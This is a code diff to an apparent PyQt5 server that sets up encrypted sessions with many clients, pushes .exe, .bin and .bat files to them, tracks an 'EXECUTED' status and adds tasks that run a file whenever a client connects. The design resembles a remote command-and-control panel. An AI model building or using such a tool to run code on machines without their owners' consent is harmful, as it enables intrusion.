@@ -18,9 +18,11 @@ from PyQt5.QtWidgets import (QApplication, QMainWindow, QTextEdit, QPushButton, 
                             QWidget, QFileDialog, QTableWidget, QTableWidgetItem, QToolBar, QStatusBar, 
                             QSplitter, QLabel, QHeaderView, QMessageBox, QMenu, QAction, QSystemTrayIcon,
                             QStyle, QStyleFactory, QGroupBox, QTabWidget, QSpinBox, QLineEdit, QComboBox,
-                            QDateTimeEdit, QCheckBox, QFormLayout)
-from PyQt5.QtCore import pyqtSignal, QThread, Qt, QObject, QMetaObject, Q_ARG, pyqtSlot, QTimer, QSize, QDateTime
-from PyQt5.QtGui import QFont, QIcon, QColor, QPalette, QLinearGradient, QGradient
+                            QDateTimeEdit, QCheckBox, QFormLayout, QListWidget, QListWidgetItem, QRadioButton,
+                            QButtonGroup, QFrame, QDockWidget, QProgressBar, QScrollArea, QStyledItemDelegate)
+from PyQt5.QtCore import (pyqtSignal, QThread, Qt, QObject, QMetaObject, Q_ARG, pyqtSlot, QTimer, QSize, 
+                         QDateTime, QFileSystemWatcher, QDir, QFile, QEvent)
+from PyQt5.QtGui import QFont, QIcon, QColor, QPalette, QLinearGradient, QGradient, QPixmap, QDrag, QDragEnterEvent
 
 import sys
 import time
@@ -76,7 +78,7 @@ MAX_CLIENTS = 50
 RATE_LIMIT = 10  # requests per minute
 BLOCK_DURATION = 300  # 5 minutes
 MAX_FILE_SIZE = 10 * 1024 * 1024  # 10MB
-ALLOWED_FILE_TYPES = {'.exe', '.bin'}  # Whitelist of allowed file extensions
+ALLOWED_FILE_TYPES = {'.exe', '.bin', '.bat'}  # Whitelist of allowed file extensions
 BUFFER_SIZE = 4096
 CONNECTION_TIMEOUT = 30  # Increased from 10 to 30 seconds
 HEARTBEAT_INTERVAL = 30  # seconds
@@ -111,199 +113,95 @@ def compute_hmac(data: bytes, key: bytes) -> bytes:
     return hmac.new(key, data, hashlib.sha256).digest()
 
 def perform_dh_key_exchange(conn: socket.socket) -> bytes:
+    """Perform Diffie-Hellman key exchange with the client."""
     try:
-        # Set timeout to prevent hanging
-        conn.settimeout(15) # Increased from 10 to 15 seconds
-        
-        # Configure socket with more moderate settings
-        conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-        conn.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
-        # Use smaller buffer sizes to avoid overwhelming the network stack
-        conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 32768) # Reduced from 65536
-        conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 32768) # Reduced from 65536
-        
-        if sys.platform == 'win32':
-            try:
-                conn.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 10000))
-            except Exception as e:
-                logger.warning(f"Failed to set SIO_KEEPALIVE_VALS: {e}")
-        
-        # Generate DH parameters and keys
-        parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
-        private_key = parameters.generate_private_key()
-        public_key = private_key.public_key()
-        
-        param_bytes = parameters.parameter_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.ParameterFormat.PKCS3
-        )
-        pub_bytes = public_key.public_bytes(
-            encoding=serialization.Encoding.PEM,
-            format=serialization.PublicFormat.SubjectPublicKeyInfo
-        )
-        
-        # Send parameters with improved error handling and smaller chunks
-        max_retries = 3
-        retry_delay = 0.5  # Increased initial delay
-        
-        for attempt in range(max_retries):
-            try:
-                logger.info(f"Sending DH parameters to client (attempt {attempt+1})")
-                
-                # Send length header with proper error checking
-                header = struct.pack('!I', len(param_bytes))
-                total_sent = 0
-                while total_sent < len(header):
-                    sent = conn.send(header[total_sent:])
-                    if sent == 0:
-                        raise ConnectionError("Socket connection broken during header send")
-                    total_sent += sent
-                
-                # Send parameters in smaller chunks with proper error handling
-                chunk_size = 512  # Reduced from 1024
-                total_sent = 0
-                while total_sent < len(param_bytes):
-                    end_pos = min(total_sent + chunk_size, len(param_bytes))
-                    chunk = param_bytes[total_sent:end_pos]
-                    try:
-                        sent = conn.send(chunk)
-                        if sent == 0:
-                            raise ConnectionError("Socket connection broken during parameter send")
-                        total_sent += sent
-                        # Small delay between chunks to prevent overwhelming socket buffers
-                        time.sleep(0.002)  # 2ms delay between chunks
-                    except Exception as chunk_err:
-                        logger.error(f"Error sending parameter chunk: {chunk_err}")
-                        raise
-                
-                logger.info("Successfully sent DH parameters")
-                break  # Exit retry loop if successful
-            
-            except (socket.error, ConnectionError) as e:
-                logger.warning(f"Error sending parameters (attempt {attempt+1}): {e}")
-                if attempt == max_retries - 1:
-                    raise SecurityError(f"Failed to send parameters after {max_retries} attempts: {e}")
-                
-                # Try to verify if socket is still connected before retrying
-                try:
-                    # Check if socket is closed by trying to peek at incoming data
-                    ready = select.select([conn], [], [], 0.1)
-                    if ready[0]:
-                        peek_data = conn.recv(1, socket.MSG_PEEK)
-                        if not peek_data:  # Socket closed
-                            raise ConnectionError("Socket appears to be closed")
-                except Exception:
-                    # If any error occurs during check, assume connection is broken
-                    raise ConnectionError("Connection verification failed")
-                
-                # If we got here, connection seems viable, so sleep and retry
-                time.sleep(retry_delay)
-                retry_delay *= 1.5  # More gradual backoff
-
-        # Send public key with similar improvements
-        retry_delay = 0.5
-        for attempt in range(max_retries):
-            try:
-                logger.info(f"Sending DH public key to client (attempt {attempt+1})")
-                
-                # Send length header
-                header = struct.pack('!I', len(pub_bytes))
-                total_sent = 0
-                while total_sent < len(header):
-                    sent = conn.send(header[total_sent:])
-                    if sent == 0:
-                        raise ConnectionError("Socket connection broken during header send")
-                    total_sent += sent
-                
-                # Send public key in chunks
-                chunk_size = 512
-                total_sent = 0
-                while total_sent < len(pub_bytes):
-                    end_pos = min(total_sent + chunk_size, len(pub_bytes))
-                    chunk = pub_bytes[total_sent:end_pos]
-                    sent = conn.send(chunk)
-                    if sent == 0:
-                        raise ConnectionError("Socket connection broken during public key send")
-                    total_sent += sent
-                    time.sleep(0.002)  # 2ms delay between chunks
-                
-                logger.info("Successfully sent DH public key")
-                break  # Exit retry loop if successful
-            
-            except (socket.error, ConnectionError) as e:
-                logger.warning(f"Error sending public key (attempt {attempt+1}): {e}")
-                if attempt == max_retries - 1:
-                    raise SecurityError(f"Failed to send public key after {max_retries} attempts: {e}")
-                time.sleep(retry_delay)
-                retry_delay *= 1.5
-        
-        # Receive client's public key with retry logic
-        retry_delay = 0.5
-        client_pub_bytes = None  # Initialize outside the loop
-        
-        for attempt in range(max_retries):
-            try:
-                logger.info(f"Receiving client public key (attempt {attempt+1})")
-                
-                # Receive header
-                header = b''
-                bytes_received = 0
-                while bytes_received < 4:
-                    chunk = conn.recv(4 - bytes_received)
-                    if not chunk:
-                        raise ConnectionError("Connection closed while receiving header")
-                    header += chunk
-                    bytes_received += len(chunk)
-                
-                pub_len = struct.unpack('!I', header)[0]
-                if pub_len > 4096:  # Sanity check
-                    raise SecurityError("Invalid client public key size")
-                
-                # Receive public key in smaller chunks
-                client_pub_bytes = b''
-                bytes_received = 0
-                while bytes_received < pub_len:
-                    max_chunk = min(512, pub_len - bytes_received)  # Never read more than needed
-                    chunk = conn.recv(max_chunk)
-                    if not chunk:
-                        raise ConnectionError("Connection closed during key reception")
-                    client_pub_bytes += chunk
-                    bytes_received += len(chunk)
-                    time.sleep(0.001)  # Small delay between reads
-                
-                if len(client_pub_bytes) != pub_len:
-                    raise SecurityError("Incomplete client public key received")
-                
-                logger.info("Successfully received client public key")
-                break  # Exit retry loop if successful
-                
-            except (socket.error, ConnectionError) as e:
-                logger.warning(f"Error receiving client public key (attempt {attempt+1}): {e}")
-                if attempt == max_retries - 1:
-                    raise SecurityError(f"Failed to receive client public key after {max_retries} attempts: {e}")
-                time.sleep(retry_delay)
-                retry_delay *= 1.5
+        # Set socket to blocking mode for the key exchange
+        old_blocking_mode = conn.getblocking()
+        conn.setblocking(True)
         
         try:
+            # Set a socket timeout just to be safe
+            conn.settimeout(15.0)
+            
+            # Generate DH parameters
+            parameters = dh.generate_parameters(generator=2, key_size=2048, backend=default_backend())
+            private_key = parameters.generate_private_key()
+            public_key = private_key.public_key()
+            
+            # Convert parameters to PEM format
+            param_bytes = parameters.parameter_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.ParameterFormat.PKCS3
+            )
+            
+            # Send parameters to client
+            logger.info("Sending DH parameters to client")
+            conn.sendall(FRAME_HEADER.pack(len(param_bytes)) + param_bytes)
+            logger.info("Successfully sent DH parameters")
+            
+            # Send our public key
+            logger.info("Sending DH public key to client")
+            pub_bytes = public_key.public_bytes(
+                encoding=serialization.Encoding.PEM,
+                format=serialization.PublicFormat.SubjectPublicKeyInfo
+            )
+            conn.sendall(FRAME_HEADER.pack(len(pub_bytes)) + pub_bytes)
+            logger.info("Successfully sent DH public key")
+            
+            # Receive client's public key
+            logger.info("Receiving client public key")
+            header = conn.recv(4)
+            if not header or len(header) < 4:
+                raise SecurityError("Incomplete or no header received for client public key")
+                
+            length = struct.unpack('!I', header)[0]
+            if length > 8192:  # Reasonable max size for public key
+                raise SecurityError(f"Invalid public key size: {length}")
+                
+            logger.info(f"Receiving client public key of length {length}")
+            
+            # Receive the key data in chunks
+            client_pub_bytes = b''
+            bytes_received = 0
+            chunk_size = 1024
+            
+            while bytes_received < length:
+                chunk = conn.recv(min(chunk_size, length - bytes_received))
+                if not chunk:
+                    raise SecurityError(f"Connection closed while receiving client public key ({bytes_received}/{length} bytes received)")
+                client_pub_bytes += chunk
+                bytes_received += len(chunk)
+                
+            if bytes_received != length:
+                raise SecurityError(f"Incomplete client public key received: {bytes_received}/{length} bytes")
+                
+            logger.info("Successfully received client public key")
+            
+            # Load client public key and compute shared secret
             logger.info("Loading client public key and computing shared secret")
             client_pub_key = serialization.load_pem_public_key(client_pub_bytes, backend=default_backend())
             shared_secret = private_key.exchange(client_pub_key)
             session_key = hashlib.sha256(shared_secret).digest()
+            
             logger.info("DH key exchange completed successfully")
             return session_key
-        except Exception as e:
-            logger.error(f"Failed to generate session key: {e}")
-            raise SecurityError(f"Failed to generate session key: {e}")
             
-    except Exception as e:
-        logger.error(f"DH key exchange failed: {e}")
-        raise SecurityError(f"Key exchange failed: {e}")
+        except Exception as e:
+            logger.error(f"DH key exchange failed: {e}")
+            raise SecurityError(f"Key exchange failed: {e}")
+        
     finally:
-        # Reset timeout to default
+        # Restore original blocking mode
+        try:
+            conn.setblocking(old_blocking_mode)
+        except:
+            pass
+        
+        # Clear socket timeout
         try:
             conn.settimeout(None)
         except:
-            pass  # Socket might be closed already
+            pass
 
 def send_framed_message(conn: socket.socket, data: bytes, key: bytes) -> None:
     """Send a framed message with built-in authentication."""
@@ -329,27 +227,93 @@ def send_file(conn: socket.socket, file_path: str, key: bytes) -> bool:
         if file_size > MAX_FILE_SIZE:
             raise SecurityError(f"File too large: {file_size} bytes")
             
+        logger.info(f"Reading file: {file_path}, size: {file_size} bytes")
         with open(file_path, 'rb') as f:
             file_data = f.read()
         
+        # Check socket state before starting
+        if not socket_is_alive(conn):
+            logger.error("Socket appears to be closed or in error state")
+            return False
+            
+        # Calculate and send file hash
         file_hash = hashlib.sha256(file_data).hexdigest()
+        logger.info(f"Sending file hash: {file_hash[:8]}...")
         
-        # Send file hash
-        encrypted_hash = encrypt_data(file_hash.encode(), key)
-        conn.sendall(FRAME_HEADER.pack(len(encrypted_hash)) + encrypted_hash)
+        try:
+            encrypted_hash = encrypt_data(file_hash.encode(), key)
+            conn.sendall(FRAME_HEADER.pack(len(encrypted_hash)) + encrypted_hash)
+        except socket.error as e:
+            logger.error(f"Socket error while sending file hash: {e}")
+            return False
+        except Exception as e:
+            logger.error(f"Error sending file hash: {e}")
+            return False
+            
+        # Check socket state before continuing
+        if not socket_is_alive(conn):
+            logger.error("Socket closed after sending file hash")
+            return False
         
         # Send file size
-        encrypted_size = encrypt_data(struct.pack('!Q', len(file_data)), key)
-        conn.sendall(FRAME_HEADER.pack(len(encrypted_size)) + encrypted_size)
+        logger.info(f"Sending file size: {len(file_data)} bytes")
+        try:
+            size_bytes = struct.pack('!Q', len(file_data))
+            encrypted_size = encrypt_data(size_bytes, key)
+            conn.sendall(FRAME_HEADER.pack(len(encrypted_size)) + encrypted_size)
+        except socket.error as e:
+            logger.error(f"Socket error while sending file size: {e}")
+            return False
+        except Exception as e:
+            logger.error(f"Error sending file size: {e}")
+            return False
+            
+        # Check socket state before continuing
+        if not socket_is_alive(conn):
+            logger.error("Socket closed after sending file size")
+            return False
         
-        # Send encrypted file
-        encrypted_file = encrypt_data(file_data, key)
-        conn.sendall(FRAME_HEADER.pack(len(encrypted_file)) + encrypted_file)
+        # Send encrypted file data
+        logger.info("Encrypting and sending file data...")
+        try:
+            encrypted_file = encrypt_data(file_data, key)
+            logger.info(f"Sending {len(encrypted_file)} bytes of encrypted file data")
+            conn.sendall(FRAME_HEADER.pack(len(encrypted_file)) + encrypted_file)
+        except socket.error as e:
+            logger.error(f"Socket error while sending file data: {e}")
+            return False
+        except Exception as e:
+            logger.error(f"Error sending file data: {e}")
+            return False
         
+        logger.info(f"File {os.path.basename(file_path)} sent successfully")
         return True
     except Exception as e:
         logger.error(f"Error sending file: {e}")
         return False
+
+def socket_is_alive(sock: socket.socket) -> bool:
+    """Check if a socket is still connected and usable"""
+    if sock is None:
+        return False
+        
+    try:
+        # Check if socket is readable/writable with a short timeout
+        readable, writable, _ = select.select([sock], [sock], [], 0.1)
+        
+        if readable and not writable:
+            # Socket is readable but not writable, might be closed
+            # Try to peek at incoming data
+            try:
+                data = sock.recv(1, socket.MSG_PEEK)
+                if len(data) == 0:  # Connection closed by peer
+                    return False
+            except:
+                return False
+                
+        return writable  # If writable, socket is probably still usable
+    except:
+        return False  # Any exception means socket is not usable
 
 class SignalHandler(QObject):
     log_signal = pyqtSignal(str)
@@ -375,24 +339,20 @@ class ClientHandler(QThread):
             if sys.platform == 'win32':
                 self.conn.ioctl(socket.SIO_KEEPALIVE_VALS, (1, 30000, 10000))
             self.conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 65536)
-            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
+            # Increase buffer sizes for better performance
+            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 262144)  # 256KB
+            self.conn.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 262144)  # 256KB
 
-            # 1. Add client to GUI first (this will also set initial status via _add_client_impl)
+            # 1. Add client to GUI first with minimal status updates
             QMetaObject.invokeMethod(self.signal_handler, "add_client_signal",
                                    Qt.QueuedConnection,
                                    Q_ARG(tuple, self.addr))
-            # Short delay to allow GUI to process the add_client_signal before key exchange potentially fails fast
-            # This is a pragmatic way to reduce race conditions in queued GUI updates.
-            time.sleep(0.1) 
 
             # 2. Perform key exchange
-            QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
-                                   Qt.QueuedConnection,
-                                   Q_ARG(tuple, self.addr),
-                                   Q_ARG(str, "Key Exchange...")) # More specific status
             try:
+                # Skip intermediate status updates during key exchange to reduce UI load
                 self.session_key = perform_dh_key_exchange(self.conn)
+                # Only update status after successful key exchange
                 QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
                                        Qt.QueuedConnection,
                                        Q_ARG(tuple, self.addr),
@@ -403,8 +363,6 @@ class ClientHandler(QThread):
                                        Qt.QueuedConnection,
                                        Q_ARG(tuple, self.addr),
                                        Q_ARG(str, "Key Exchange Failed"))
-                # No return here, finally block will handle removal if needed
-                # but we mark it as not running so the main loop doesn't start
                 self.running = False 
             except socket.timeout as e:
                 logger.error(f"Key exchange timed out for {self.addr}: {e}")
@@ -421,8 +379,7 @@ class ClientHandler(QThread):
                                        Q_ARG(str, "Key Exchange Error"))
                 self.running = False
             
-            if not self.running: # If key exchange failed
-                 # The finally block will emit remove_client_signal
+            if not self.running:
                 return
             
             # Set socket to non-blocking after key exchange
@@ -431,7 +388,8 @@ class ClientHandler(QThread):
             # Use a buffer for messages to reduce GUI updates
             message_buffer = []
             last_update = time.time()
-            update_interval = 0.1  # Update GUI every 100ms
+            update_interval = 1.0  # Increased to 1 second to reduce UI load
+            max_buffer_size = 50  # Limit buffer size to prevent memory issues
             
             while self.running:
                 try:
@@ -443,6 +401,13 @@ class ClientHandler(QThread):
                     # Use select with a short timeout
                     ready = select.select([self.conn], [], [], 0.1)
                     if not ready[0]:
+                        # Process buffer if it's getting too large or enough time has passed
+                        current_time = time.time()
+                        if (len(message_buffer) >= max_buffer_size or 
+                            (current_time - last_update >= update_interval and message_buffer)):
+                            self._process_message_buffer(message_buffer)
+                            message_buffer = []
+                            last_update = current_time
                         continue
 
                     try:
@@ -465,18 +430,17 @@ class ClientHandler(QThread):
                         if message == "HEARTBEAT":
                             # Respond to heartbeat immediately
                             send_framed_message(self.conn, b"HEARTBEAT", self.session_key)
-                            message_buffer.append(("update_status", "Connected"))
+                            # Don't buffer heartbeats to reduce UI updates
                         elif message == "EXECUTED":
                             message_buffer.append(("update_status", "Executed"))
                         else:
                             message_buffer.append(("log", message))
                             
-                        # Batch GUI updates
-                        current_time = time.time()
-                        if current_time - last_update >= update_interval and message_buffer:
+                        # Process buffer if it's getting too large
+                        if len(message_buffer) >= max_buffer_size:
                             self._process_message_buffer(message_buffer)
                             message_buffer = []
-                            last_update = current_time
+                            last_update = time.time()
                             
                     except BlockingIOError:
                         continue
@@ -540,23 +504,77 @@ class ClientHandler(QThread):
             if not self.session_key:
                 logger.error(f"No session key for {self.addr}")
                 return False
-                
-            command = b"FILE_TRANSFER"
-            encrypted_command = encrypt_data(command, self.session_key)
-            self.conn.sendall(FRAME_HEADER.pack(len(encrypted_command)) + encrypted_command)
             
-            if send_file(self.conn, file_path, self.session_key):
-                QMetaObject.invokeMethod(self.signal_handler, "update_client_status_signal",
-                                       Qt.QueuedConnection,
-                                       Q_ARG(tuple, self.addr),
-                                       Q_ARG(str, "Sending File"))
-                return True
-            else:
-                logger.error(f"Failed to send file {file_path} to {self.addr}")
+            # First check if client is still connected
+            try:
+                # Use select to check if socket is writable with timeout
+                readable, writable, exceptional = select.select([], [self.conn], [self.conn], 2.0)
+                if not writable or exceptional:
+                    logger.error(f"Socket to {self.addr} not ready for writing")
+                    return False
+            except Exception as e:
+                logger.error(f"Error checking socket to {self.addr}: {e}")
                 return False
+                
+            # Notify client about incoming file
+            logger.info(f"Sending FILE_TRANSFER command to {self.addr}")
+            command = b"FILE_TRANSFER"
+            try:
+                encrypted_command = encrypt_data(command, self.session_key)
+                # Set socket back to blocking mode temporarily to ensure complete send
+                self.conn.setblocking(True)
+                self.conn.sendall(FRAME_HEADER.pack(len(encrypted_command)) + encrypted_command)
+            except Exception as e:
+                logger.error(f"Error sending FILE_TRANSFER command to {self.addr}: {e}")
+                self.conn.setblocking(False)  # Restore non-blocking mode
+                return False
+
+            # Calculate file hash
+            file_hash = hashlib.sha256()
+            with open(file_path, 'rb') as f:
+                while chunk := f.read(8192):  # Read in 8KB chunks
+                    file_hash.update(chunk)
+            file_hash = file_hash.hexdigest()
+            
+            # Send file hash
+            encrypted_hash = encrypt_data(file_hash.encode(), self.session_key)
+            self.conn.sendall(FRAME_HEADER.pack(len(encrypted_hash)) + encrypted_hash)
+            
+            # Send file size
+            file_size = os.path.getsize(file_path)
+            encrypted_size = encrypt_data(struct.pack('!Q', file_size), self.session_key)
+            self.conn.sendall(FRAME_HEADER.pack(len(encrypted_size)) + encrypted_size)
+            
+            # Send file data in chunks
+            chunk_size = 32768  # 32KB chunks
+            total_sent = 0
+            last_progress = 0
+            
+            with open(file_path, 'rb') as f:
+                while True:
+                    chunk = f.read(chunk_size)
+                    if not chunk:
+                        break
+                        
+                    encrypted_chunk = encrypt_data(chunk, self.session_key)
+                    self.conn.sendall(FRAME_HEADER.pack(len(encrypted_chunk)) + encrypted_chunk)
+                    
+                    total_sent += len(chunk)
+                    progress = int(total_sent * 100 / file_size)
+                    
+                    # Log progress every 10%
+                    if progress - last_progress >= 10:
+                        logger.info(f"File transfer progress: {progress}%")
+                        last_progress = progress
+            
+            logger.info(f"File transfer completed: {file_path}")
+            return True
+            
         except Exception as e:
             logger.error(f"Error sending file to {self.addr}: {e}")
             return False
+        finally:
+            self.conn.setblocking(False)  # Restore non-blocking mode
 
 class RateLimiter:
     def __init__(self, limit: int, window: int):
@@ -624,17 +642,59 @@ class FileSenderThread(QThread):
         self.signal_handler = signal_handler
         self.addr = addr
         self.finished.connect(self.deleteLater)  # Ensure proper cleanup
+        self.success = False
 
     def run(self):
         try:
             if self.addr:
+                # Sending to a specific client
                 client = self.client_manager.get_client(self.addr)
                 if client:
-                    client.send_file_to_client(self.file_path)
+                    logger.info(f"FileSenderThread: Sending {self.file_path} to client {self.addr}")
+                    if not hasattr(client, 'session_key') or not client.session_key:
+                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
+                                              Qt.QueuedConnection,
+                                              Q_ARG(str, f"Error: Client {self.addr} has no secure session established"))
+                        return
+                    
+                    success = client.send_file_to_client(self.file_path)
+                    if success:
+                        self.success = True
+                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
+                                              Qt.QueuedConnection,
+                                              Q_ARG(str, f"Successfully sent {os.path.basename(self.file_path)} to {self.addr}"))
+                    else:
+                        QMetaObject.invokeMethod(self.signal_handler, "log_signal",
+                                              Qt.QueuedConnection,
+                                              Q_ARG(str, f"Failed to send {os.path.basename(self.file_path)} to {self.addr}"))
+                else:
+                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
+                                          Qt.QueuedConnection,
+                                          Q_ARG(str, f"Client {self.addr} not found for file transfer"))
             else:
-                for addr, client in self.client_manager.get_all_clients().items():
-                    client.send_file_to_client(self.file_path)
+                # Sending to all clients
+                clients = list(self.client_manager.get_all_clients().items())
+                total_clients = len(clients)
+                success_count = 0
+                
+                if total_clients == 0:
+                    QMetaObject.invokeMethod(self.signal_handler, "log_signal",
+                                           Qt.QueuedConnection,
+                                           Q_ARG(str, "No clients connected to send file to"))
+                    return
+                
+                for addr, client in clients:
+                    if hasattr(client, 'session_key') and client.session_key:
+                        if client.send_file_to_client(self.file_path):
+                            success_count += 1
+                
+                self.success = success_count > 0
+                
+                QMetaObject.invokeMethod(self.signal_handler, "log_signal",
+                                        Qt.QueuedConnection,
+                                        Q_ARG(str, f"File sent to {success_count}/{total_clients} clients"))
         except Exception as e:
+            logger.error(f"Error in FileSenderThread: {e}")
             QMetaObject.invokeMethod(self.signal_handler, "log_signal",
                                    Qt.QueuedConnection,
                                    Q_ARG(str, f"Error sending file: {e}"))
@@ -759,24 +819,70 @@ class ServerThread(QThread):
                 logger.warning("ServerThread's run() method did not terminate in time.")
         logger.info("ServerThread.stop() finished.")
 
-    def send_file_to_client(self, file_path: str, addr: tuple = None):
+    def send_file_to_client(self, file_path: str, addr: tuple = None, retry_count=0, max_retries=3):
+        """Send a file to a client with retry capability if session key isn't established yet"""
+        # Check if file exists
         if not os.path.exists(file_path):
+            logger.error(f"File not found: {file_path}")
             self.signal_handler.log_signal.emit(f"File not found: {file_path}")
-            return
-            
+            return False
+        
+        # Log the file info    
+        file_size = os.path.getsize(file_path)
         file_ext = os.path.splitext(file_path)[1].lower()
+        logger.info(f"File: {os.path.basename(file_path)}, Size: {file_size} bytes, Type: {file_ext}")
+            
+        # Check file type
         if file_ext not in ALLOWED_FILE_TYPES:
+            logger.error(f"File type not allowed: {file_ext}")
             self.signal_handler.log_signal.emit(f"File type not allowed: {file_ext}")
-            return
+            return False
             
-        if os.path.getsize(file_path) > MAX_FILE_SIZE:
+        # Check file size    
+        if file_size > MAX_FILE_SIZE:
+            logger.error(f"File too large: {file_size} bytes (max: {MAX_FILE_SIZE} bytes)")
             self.signal_handler.log_signal.emit(f"File too large: {file_path}")
-            return
+            return False
+        
+        # Handle empty files
+        if file_size == 0:
+            logger.warning(f"File is empty: {file_path}")
+            self.signal_handler.log_signal.emit(f"Warning: File is empty: {os.path.basename(file_path)}")
+            # Continue anyway
+        
+        # If sending to a specific client
+        if addr:
+            client = self.client_manager.get_client(addr)
+            if not client:
+                logger.error(f"No client found with address {addr}")
+                self.signal_handler.log_signal.emit(f"No client found with address {addr}")
+                return False
+
+            # Check if session key is established
+            if not hasattr(client, 'session_key') or not client.session_key:
+                # If we've reached max retries, give up
+                if retry_count >= max_retries:
+                    logger.error(f"Failed to send file to {addr} after {max_retries} attempts: no session key established")
+                    self.signal_handler.log_signal.emit(f"Failed to send file to {addr}: no secure connection")
+                    return False
+                
+                # Otherwise retry after a delay
+                logger.info(f"No session key for {addr}, retry {retry_count+1}/{max_retries+1} in 2s")
+                delay = 2000  # 2 seconds
+                QTimer.singleShot(delay, lambda: self.send_file_to_client(file_path, addr, retry_count + 1, max_retries))
+                return True  # Return True to indicate we're still working on it
             
+        # Log the sending operation
+        logger.info(f"Sending file {file_path} to {addr if addr else 'all clients'}")
+        self.signal_handler.log_signal.emit(f"Sending file {os.path.basename(file_path)} to {addr if addr else 'all clients'}")
+            
+        # Create and start file sender thread
         sender_thread = FileSenderThread(self.client_manager, file_path, self.signal_handler, addr)
         self.file_sender_threads.append(sender_thread)  # Keep reference to thread
         sender_thread.finished.connect(lambda: self.file_sender_threads.remove(sender_thread))  # Remove when done
         sender_thread.start()
+        
+        return True
 
 class LogType:
     CONNECTION = "Connection"
@@ -786,21 +892,397 @@ class LogType:
     ERROR = "Error"
 
 class AutomationTask:
-    def __init__(self, name, script, schedule, target_clients=None):
+    def __init__(self, name, file_path=None, script=None, schedule=None, target_clients=None, execute_on_connect=False):
         self.name = name
+        self.file_path = file_path
         self.script = script
         self.schedule = schedule
         self.target_clients = target_clients or []
+        self.execute_on_connect = execute_on_connect
         self.last_run = None
-        self.enabled = True
+        self.enabled = True  # Default to enabled
+        self.status = "Ready"  # Current status (Ready, Running, Failed, Completed)
 
 class ServerGUI(QMainWindow):
+    # Auto Tasks methods
+    def refresh_auto_tasks_files(self, path=None):
+        """Refresh the list of available files in the autotasks directory"""
+        try:
+            self.files_list.clear()
+            if os.path.exists(self.auto_tasks_dir):
+                for file in os.listdir(self.auto_tasks_dir):
+                    file_path = os.path.join(self.auto_tasks_dir, file)
+                    if os.path.isfile(file_path):
+                        item = QListWidgetItem(file)
+                        item.setToolTip(file_path)
+                        # Add icon based on file type
+                        if file.endswith('.exe'):
+                            item.setIcon(self.style().standardIcon(QStyle.SP_FileDialogDetailedView))
+                        elif file.endswith('.bat'):
+                            item.setIcon(self.style().standardIcon(QStyle.SP_FileDialogContentsView))
+                        else:
+                            item.setIcon(self.style().standardIcon(QStyle.SP_FileIcon))
+                        self.files_list.addItem(item)
+        except Exception as e:
+            logger.error(f"Error refreshing auto tasks files: {e}")
+
+    def add_task_file(self):
+        """Add a file to the auto tasks directory"""
+        try:
+            file_path, _ = QFileDialog.getOpenFileName(
+                self, 
+                "Select File to Add", 
+                "", 
+                "Executable Files (*.exe);;Batch Files (*.bat);;All Files (*.*)"
+            )
+            
+            if file_path:
+                file_name = os.path.basename(file_path)
+                dest_path = os.path.join(self.auto_tasks_dir, file_name)
+                
+                # Check if file already exists
+                if os.path.exists(dest_path):
+                    reply = QMessageBox.question(
+                        self, 
+                        "File Already Exists",
+                        f"The file '{file_name}' already exists in the auto tasks directory. Replace it?",
+                        QMessageBox.Yes | QMessageBox.No,
+                        QMessageBox.No
+                    )
+                    if reply != QMessageBox.Yes:
+                        return
+                
+                # Copy the file to auto tasks directory
+                import shutil
+                shutil.copy2(file_path, dest_path)
+                
+                # Add to file list (will be picked up by the file watcher)
+                self.refresh_auto_tasks_files()
+                
+                QMessageBox.information(
+                    self,
+                    "File Added",
+                    f"The file '{file_name}' has been added to auto tasks."
+                )
+        except Exception as e:
+            logger.error(f"Error adding task file: {e}")
+            QMessageBox.critical(
+                self,
+                "Error",
+                f"Failed to add task file: {e}"
+            )
+
+    def open_tasks_folder(self):
+        """Open the auto tasks folder in the file explorer"""
+        try:
+            import subprocess
+            folder_path = os.path.abspath(self.auto_tasks_dir)
+            if os.path.exists(folder_path):
+                if sys.platform == 'win32':
+                    os.startfile(folder_path)
+                else:
+                    subprocess.Popen(['xdg-open', folder_path])
+        except Exception as e:
+            logger.error(f"Error opening tasks folder: {e}")
+            QMessageBox.critical(
+                self,
+                "Error",
+                f"Failed to open tasks folder: {e}"
+            )
+
+    def add_new_task(self):
+        """Create a new auto task"""
+        try:
+            # Check if any files available
+            if self.files_list.count() == 0:
+                QMessageBox.warning(
+                    self,
+                    "No Files Available",
+                    "Please add files to the auto tasks directory first."
+                )
+                return
+
+            # Get selected file
+            selected_items = self.files_list.selectedItems()
+            if not selected_items:
+                QMessageBox.warning(
+                    self,
+                    "No File Selected",
+                    "Please select a file from the list."
+                )
+                return
+                
+            file_name = selected_items[0].text()
+            file_path = os.path.join(self.auto_tasks_dir, file_name)
+            
+            # Create task name with unique identifier
+            task_name = f"Task_{file_name}_{len(self.auto_tasks)}"
+            
+            # Create task with default settings
+            task = AutomationTask(
+                name=task_name,
+                file_path=file_path,
+                execute_on_connect=True  # By default, execute when client connects
+            )
+            
+            # Add to the auto_tasks dictionary
+            with self.auto_tasks_lock:
+                self.auto_tasks[task_name] = task
+            
+            # Add to task table
+            row = self.tasks_table.rowCount()
+            self.tasks_table.insertRow(row)
+            
+            self.tasks_table.setItem(row, 0, QTableWidgetItem(task_name))
+            self.tasks_table.setItem(row, 1, QTableWidgetItem("File Execution"))
+            self.tasks_table.setItem(row, 2, QTableWidgetItem("On Connect"))
+            self.tasks_table.setItem(row, 3, QTableWidgetItem("Ready"))
+            
+            QMessageBox.information(
+                self,
+                "Task Added",
